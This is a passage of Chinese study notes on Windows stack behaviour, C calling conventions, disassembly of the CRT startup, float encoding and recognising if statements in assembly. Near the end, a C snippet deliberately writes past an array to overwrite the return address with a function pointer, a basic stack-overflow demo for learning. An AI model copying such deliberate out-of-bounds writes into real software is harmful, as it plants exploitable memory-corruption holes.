或者内存</p>\n<p>Windows 堆栈特点</p>\n<p>1. 现进后出</p>\n<p>2. 向低地址扩展</p>\n<p>windows 中的堆栈，是一块普通的内存，主要用来存储一些临时的数据和参数等可以把 Windows 中的堆栈想象成是一个公用的书箱，函数就像是使用箱子的人函数在执行的时候，会用到这个书箱，把一些数据存到里面，但用完的时候一定要记得把书拿走，否则会乱的，也就是说，你放进去几本书，走的时候也要拿走几本书，这个就是堆栈平衡.</p>\n<h2 id=\"c语言\"><a class=\"markdownIt-Anchor\" href=\"#c语言\">#</a> C 语言</h2>\n<h3 id=\"vc60\"><a class=\"markdownIt-Anchor\" href=\"#vc60\">#</a> VC6.0</h3>\n<p><strong>快捷键</strong></p>\n<p>F7 编译</p>\n<p>F5 执行</p>\n<p>shift + F5 结束</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103212249828.png\" alt=\"image-20230103212249828\"></p>\n<p>函数名、参数名、变量名的命名规则：只能包含字母、数字和_且不能以数字开头.</p>\n<p><strong>函数返回值</strong></p>\n<p>1. 无参数，无返回值的格式形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>当函数没有参数时不需要提升和降低堆栈</strong></p>\n<p>2. 有参数，无返回值函数格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void fn(int a,double b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>裸函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) func1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> __declspec(naked) func1(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">调用裸函数中没有代码，没有ret,不能正常返回，会报错</span><br><span class=\"line\">需要手动加内联汇编中ret返回 </span><br></pre></td></tr></table></figure>\n<p>调用约定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__cdecl\t\t\t从右至左入栈\t\t\t\t\t\t\t调用者清理栈\t\t\t\t\t默认调用约定</span><br><span class=\"line\">__stdcall\t\t从右至左入栈\t\t\t\t\t\t\t自身清理堆栈\t\t\t\t\twinapi调用方式</span><br><span class=\"line\">__fastcall\t\tecx/edx传送前两个，从右至左入栈\t\t\t自身清理堆栈，如果参数大于两个，小于两个不用清理</span><br></pre></td></tr></table></figure>\n<p>函数入口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main(int 1, char * * 0x005210d8) line 23</span><br><span class=\"line\">mainCRTStartup() line 206 + 25 bytes</span><br><span class=\"line\">KERNEL32! 74d433ca()</span><br><span class=\"line\">NTDLL! 76f59ed2()</span><br><span class=\"line\">NTDLL! 76f59ea5()</span><br></pre></td></tr></table></figure>\n<p>更改入口点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230104194840789.png\" alt=\"image-20230104194840789\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main 函数被调用前要先调用的函数如下:</span><br><span class=\"line\">GetVersion()</span><br><span class=\"line\">_heap_init()</span><br><span class=\"line\">GetCommandLineA()</span><br><span class=\"line\">_crtGetEnvironmentStringsA()</span><br><span class=\"line\">_setargv(</span><br><span class=\"line\">_setenvp()</span><br><span class=\"line\">_cinit()</span><br><span class=\"line\"></span><br><span class=\"line\">以上函数都会在mainCRTStartup中初始化</span><br><span class=\"line\"></span><br><span class=\"line\">mainret = main(__argc,__argv,__environ);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401180 &gt;/$  55            push    ebp</span><br><span class=\"line\">00401181  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401183  |.  6A FF         push    -0x1</span><br><span class=\"line\">00401185  |.  68 38214200   push    00422138</span><br><span class=\"line\">0040118A  |.  68 30424000   push    _except_handler3                 ;  SE 处理程序安装</span><br><span class=\"line\">0040118F  |.  64:A1 0000000&gt;mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00401195  |.  50            push    eax</span><br><span class=\"line\">00401196  |.  64:8925 00000&gt;mov     dword ptr fs:[0],esp</span><br><span class=\"line\">0040119D  |.  83C4 F0       add     esp,-0x10</span><br><span class=\"line\">004011A0  |.  53            push    ebx</span><br><span class=\"line\">004011A1  |.  56            push    esi</span><br><span class=\"line\">004011A2  |.  57            push    edi</span><br><span class=\"line\">004011A3  |.  8965 E8       mov     [local.6],esp</span><br><span class=\"line\">004011A6  |.  FF15 4CA14200 call    dword ptr ds:[&lt;&amp;KERNEL32.GetVers&gt;;  kernel32.GetVersion</span><br><span class=\"line\">004011AC  |.  A3 707C4200   mov     dword ptr ds:[_osver],eax</span><br><span class=\"line\">004011B1  |.  A1 707C4200   mov     eax,dword ptr ds:[_osver]</span><br><span class=\"line\">004011B6  |.  C1E8 08       shr     eax,0x8</span><br><span class=\"line\">004011B9  |.  25 FF000000   and     eax,0xFF</span><br><span class=\"line\">004011BE  |.  A3 7C7C4200   mov     dword ptr ds:[_winminor],eax</span><br><span class=\"line\">004011C3  |.  8B0D 707C4200 mov     ecx,dword ptr ds:[_osver]</span><br><span class=\"line\">004011C9  |.  81E1 FF000000 and     ecx,0xFF</span><br><span class=\"line\">004011CF  |.  890D 787C4200 mov     dword ptr ds:[_winmajor],ecx</span><br><span class=\"line\">004011D5  |.  8B15 787C4200 mov     edx,dword ptr ds:[_winmajor]</span><br><span class=\"line\">004011DB  |.  C1E2 08       shl     edx,0x8</span><br><span class=\"line\">004011DE  |.  0315 7C7C4200 add     edx,dword ptr ds:[_winminor]</span><br><span class=\"line\">004011E4  |.  8915 747C4200 mov     dword ptr ds:[_winver],edx</span><br><span class=\"line\">004011EA  |.  A1 707C4200   mov     eax,dword ptr ds:[_osver]</span><br><span class=\"line\">004011EF  |.  C1E8 10       shr     eax,0x10</span><br><span class=\"line\">004011F2  |.  25 FFFF0000   and     eax,0xFFFF</span><br><span class=\"line\">004011F7  |.  A3 707C4200   mov     dword ptr ds:[_osver],eax</span><br><span class=\"line\">004011FC  |.  6A 00         push    0x0</span><br><span class=\"line\">004011FE  |.  E8 BD2D0000   call    _heap_init</span><br><span class=\"line\">00401203  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401206  |.  85C0          test    eax,eax</span><br><span class=\"line\">00401208  |.  75 0A         jnz     short 00401214</span><br><span class=\"line\">0040120A  |.  6A 1C         push    0x1C</span><br><span class=\"line\">0040120C  |.  E8 CF000000   call    fast_error_exit</span><br><span class=\"line\">00401211  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401214  |&gt;  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">0040121B  |.  E8 A0270000   call    _ioinit</span><br><span class=\"line\">00401220  |.  FF15 48A14200 call    dword ptr ds:[&lt;&amp;KERNEL32.GetComm&gt;; [GetCommandLineA</span><br><span class=\"line\">00401226  |.  A3 04964200   mov     dword ptr ds:[_acmdln],eax</span><br><span class=\"line\">0040122B  |.  E8 70250000   call    __crtGetEnvironmentStringsA</span><br><span class=\"line\">00401230  |.  A3 487C4200   mov     dword ptr ds:[_aenvptr],eax</span><br><span class=\"line\">00401235  |.  E8 56200000   call    _setargv</span><br><span class=\"line\">0040123A  |.  E8 011F0000   call    _setenvp</span><br><span class=\"line\">0040123F  |.  E8 1C1B0000   call    _cinit</span><br><span class=\"line\">00401244  |.  8B0D 8C7C4200 mov     ecx,dword ptr ds:[_environ]</span><br><span class=\"line\">0040124A  |.  890D 907C4200 mov     dword ptr ds:[__initenv],ecx</span><br><span class=\"line\">00401250  |.  8B15 8C7C4200 mov     edx,dword ptr ds:[_environ]</span><br><span class=\"line\">00401256  |.  52            push    edx</span><br><span class=\"line\">00401257  |.  A1 847C4200   mov     eax,dword ptr ds:[__argv]</span><br><span class=\"line\">0040125C  |.  50            push    eax</span><br><span class=\"line\">0040125D  |.  8B0D 807C4200 mov     ecx,dword ptr ds:[__argc]</span><br><span class=\"line\">00401263  |.  51            push    ecx</span><br><span class=\"line\">00401264  |.  E8 A1FDFFFF   call    0040100A</span><br><span class=\"line\">00401269  |.  83C4 0C       add     esp,0xC</span><br><span class=\"line\">0040126C  |.  8945 E4       mov     [local.7],eax</span><br><span class=\"line\">0040126F  |.  8B55 E4       mov     edx,[local.7]</span><br><span class=\"line\">00401272  |.  52            push    edx                              ; /status</span><br><span class=\"line\">00401273  |.  E8 281B0000   call    exit                             ; \\exit</span><br><span class=\"line\">00401278  |.  8B45 EC       mov     eax,[local.5]</span><br><span class=\"line\">0040127B  |.  8B08          mov     ecx,dword ptr ds:[eax]</span><br><span class=\"line\">0040127D  |.  8B11          mov     edx,dword ptr ds:[ecx]</span><br><span class=\"line\">0040127F  |.  8955 E0       mov     [local.8],edx</span><br><span class=\"line\">00401282  |.  8B45 EC       mov     eax,[local.5]</span><br><span class=\"line\">00401285  |.  50            push    eax</span><br><span class=\"line\">00401286  |.  8B4D E0       mov     ecx,[local.8]</span><br><span class=\"line\">00401289  |.  51            push    ecx</span><br><span class=\"line\">0040128A  |.  E8 A11C0000   call    _XcptFilter</span><br><span class=\"line\">0040128F  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00401292  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据类型\"><a class=\"markdownIt-Anchor\" href=\"#数据类型\">#</a> 数据类型</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">基本类型：   \t  整数类型</span><br><span class=\"line\">\t\t\t     浮点类型</span><br><span class=\"line\">整数类型： <span class=\"type\">char</span> <span class=\"type\">short</span> <span class=\"title function_\">int</span><span class=\"params\">(<span class=\"number\">32</span>)</span> <span class=\"title function_\">long</span><span class=\"params\">(<span class=\"number\">32</span>)</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> i = <span class=\"number\">0x12345678</span>;</span><br><span class=\"line\">mov byte ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">78</span>h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">short</span> k = <span class=\"number\">0x12345678</span>      k = <span class=\"number\">5678</span></span><br><span class=\"line\"></span><br><span class=\"line\">整数类型 <span class=\"type\">unsigned</span> <span class=\"type\">signed</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span>  a = <span class=\"number\">0xFF</span>;    <span class=\"comment\">//不写char默认int</span></span><br><span class=\"line\"><span class=\"type\">char</span> b = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">在内存中都是FF，但使用时有符号<span class=\"number\">-1</span>，无符号<span class=\"number\">255</span></span><br><span class=\"line\">类型转化，比较大小</span><br><span class=\"line\">    </span><br><span class=\"line\">编译器对于有符号和无符号的jcc编译结果不一样</span><br><span class=\"line\">jz je</span><br><span class=\"line\">    </span><br><span class=\"line\">浮点类型 <span class=\"type\">float</span> <span class=\"type\">double</span></span><br><span class=\"line\"><span class=\"type\">float</span> 存储方式 </span><br><span class=\"line\">符号位      指数部分\t\t\t尾数部分</span><br><span class=\"line\"><span class=\"number\">31</span><span class=\"number\">-30</span>      <span class=\"number\">30</span><span class=\"number\">-22</span>            <span class=\"number\">22</span><span class=\"number\">-0</span></span><br><span class=\"line\"><span class=\"type\">double</span> 存储方式 </span><br><span class=\"line\">符号位      指数部分\t\t\t尾数部分</span><br><span class=\"line\"><span class=\"number\">63</span><span class=\"number\">-62</span>      <span class=\"number\">62</span><span class=\"number\">-51</span>            <span class=\"number\">51</span><span class=\"number\">-0</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>将一个 float 型转化为内存存储格式的步骤为:</p>\n<p>1、先将这个实数的绝对值化为二进制格式<br>\n 2、将这个二进制格式实数的小数点左移或右移 n 位，直到小数点移动到第一个有效数字的右边。</p>\n<p>3、从小数点右边第一位开始数出二十三位数字放入第 22 到第 0 位。</p>\n<p>4、如果实数是正的，则在第 31 位放入 “0”，否则放入 “1”。</p>\n<p>5、如果 n 是左移得到的，说明指数是正的，第 30 位放入 “1”。如果 n 是右移得到的或 n=0，则第 30 位放入 0</p>\n<p>6、如果 n 是左移得到的，则将 n 减去 1 后化为二进制，并在左边加 “0” 补足七位，放入第 29 到第 23 位。</p>\n<p>如果 n 是右移得到的或 n=0，则将 n 化为二进制后在左边加 “0” 补足七位，再各位求反，再放入第 29 到第 23 位</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8.25</span><br><span class=\"line\">1.转为二进制数,整数部分除二取余,倒序排列,整数部分乘二取整,正序排列</span><br><span class=\"line\">\t1000.01</span><br><span class=\"line\">2.科学计数法,左移+右移-</span><br><span class=\"line\">\t1.00001*(2^3)</span><br><span class=\"line\">3.存放尾数,加起来一共23位，不够用0补，补在最后</span><br><span class=\"line\">\t00001000000000000000000</span><br><span class=\"line\">4.符号位正0负1</span><br><span class=\"line\">\t0</span><br><span class=\"line\">5.指数部分,第一位为位移方向，左移1，右移0.剩下七位是指数二进制-1的值    (或者使用127+x转为二进制填充 )</span><br><span class=\"line\">\t10000010</span><br><span class=\"line\">6.拼接</span><br><span class=\"line\">\t01000001000001000000000000000000</span><br><span class=\"line\">\t41040000</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0.25</span><br><span class=\"line\"></span><br><span class=\"line\">0.01   -&gt; 1.0</span><br><span class=\"line\">1 * (2^(-2))  右移</span><br><span class=\"line\">FD = -2-1 = -3</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\">0 1111101</span><br><span class=\"line\">00000000000000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">00111110100000000000000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">3E800000</span><br></pre></td></tr></table></figure>\n<p>尾数部分长度决定精确度，比如 8.4 的小数部分无限循环</p>\n<p>比如 float 精确到 24 位 (尾数 + 科学计数法最前面的 0 或 1)，可以精确到小数点后 6 位</p>\n<h3 id=\"编码\"><a class=\"markdownIt-Anchor\" href=\"#编码\">#</a> 编码</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过两个ASCII表示一个汉字，即为GB2312</span><br><span class=\"line\"></span><br><span class=\"line\">一个小于127的字符的意义与原来相同，但两个大于127的字符连在一起时，就表示一个汉字，前面的一个字节(他称之为高字节）从0xA1用至0xF7，后面一个字(低字节)从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。</span><br><span class=\"line\"></span><br><span class=\"line\">一个char占一个字节，放不下gb2312</span><br><span class=\"line\">gb2312每个字节最高位都是1 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>if</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if-else  /  if - if else else </span><br><span class=\"line\">只会执行其中一种分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"程序内存\"><a class=\"markdownIt-Anchor\" href=\"#程序内存\">#</a> 程序内存</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码区  可读可执行</span><br><span class=\"line\"></span><br><span class=\"line\">堆栈   参数，局部变量，临时数据</span><br><span class=\"line\"></span><br><span class=\"line\">堆    动态申请，大小可变，可读可写</span><br><span class=\"line\"></span><br><span class=\"line\">全局变量   可读可写,程序运行时分配</span><br><span class=\"line\"></span><br><span class=\"line\">常量区    只读</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>全局变量的特点:<br>\n1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存是否有值取决于声明时是否给定了初始值，如果没有，默认为 0</p>\n<p>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.</p>\n<p>3、全局变量所占内存会一直存在，知道整个进程结束.</p>\n<p>4、全局变量的反汇编识别:</p>\n<p>MOV 寄存器，byte/word/dword ptr ds: [0x12345678]</p>\n<p>通过寄存器的宽度，或者 byte/word/dword 来判断全局变量的宽度</p>\n<p>全局变量就是基址</p>\n<p>局部变量的特点</p>\n<p>1、局部变量在程序编译完成后并没有分配固定的地址.</p>\n<p>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有调用时才在堆栈中分配内存.</p>\n<p>3、当局部变量所属的方法执行先毕后，局部变量所占用的内存将变成垃圾</p>\n<p>4、局部变量只能在方法内部使用，函数 A 无法使用函数 B 的局部变量.</p>\n<p>5、局部变量的反汇编识别:</p>\n<p>判断参数个数</p>\n<p>观察调用处的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 3</span><br><span class=\"line\">call </span><br></pre></td></tr></table></figure>\n<p>找到堆栈平衡的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call</span><br><span class=\"line\">add esp,0C</span><br><span class=\"line\"></span><br><span class=\"line\">或者函数内部</span><br><span class=\"line\">ret 0xC</span><br></pre></td></tr></table></figure>\n<p>1、不考虑 ebp、 esp</p>\n<p>2、只找给别人赋值的寄存器 eax/ecx/edx/ebx/esi/edi</p>\n<p>3、找到以后追查其来源，如果，该寄存器中的值不是在函数内存赋值的，那一定是传进来的参数.</p>\n<p>公式一：寄存器 + ret4 = 参数个数</p>\n<p>公式二：寄存器＋[ebp+8] +[ebp+0x] = 参数个数</p>\n<h3 id=\"if语句\"><a class=\"markdownIt-Anchor\" href=\"#if语句\">#</a> if 语句</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int g_n = 10;</span><br><span class=\"line\">void func(int x, int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (x&gt;y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tg_n = x;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr [ebp+8]</span><br><span class=\"line\">cmp eax,dword ptr [ebp+0x0C]</span><br><span class=\"line\">jle func+29h(401049)</span><br><span class=\"line\">mov ecx,dword ptr [ebp+8]</span><br><span class=\"line\">mov dword ptr [424a30],ecx</span><br><span class=\"line\">pop edi   401049</span><br></pre></td></tr></table></figure>\n<p>在反汇编中 jcc 的代码和 if 中的判断条件是相反的</p>\n<p>还原反汇编</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110133105437.png\" alt=\"image-20230110133105437\"></p>\n<p>函数内部功能分析:</p>\n<p>1、分析参数:[ebp+8] : x   [ebp+0Ch] :Y</p>\n<p>2、分析局部变量</p>\n<p>3、分析全局变量<br>\n mov dword ptr 004225c4,ecx</p>\n<p>4、功能分析<br>\n eax, dword ptr [ebp+8]<br>\ncmp eax, dword ptr [ebp+0Ch]</p>\n<p>将参数 x 存到到 EAX 中，然后比较 EAX。与参数 Y 的大小如果 x&lt;=Y 那么跳转到 00401059 的位置</p>\n<p>否则，将 X 的值存储到全局变量中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a</span><br><span class=\"line\">int func(int x, int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint var1 = a;</span><br><span class=\"line\">\tif(x&lt;=y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ty = var1 + y;</span><br><span class=\"line\">        a = y;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tret a</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>if 会有影响寄存器的语句，然后 JCC</p>\n<p>if-else 中会有向下跳的 jmp，通过 jmp 跳过 else 之后的代码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110141055410.png\" alt=\"image-20230110141055410\"></p>\n<p>1、当每个条件跳转指令要跳转的地址前面都有 jmp 指令</p>\n<p>2、这些 jmp 指令跳转的地址都是一样的</p>\n<p>3、如果某个分支没有条件判断，则为 else 部分中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">void HelloWorld()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;helloworld&quot;);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[5] = &#123;1,2,3,4,5&#125;;</span><br><span class=\"line\">\tarr[6] = (int)HelloWorld;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 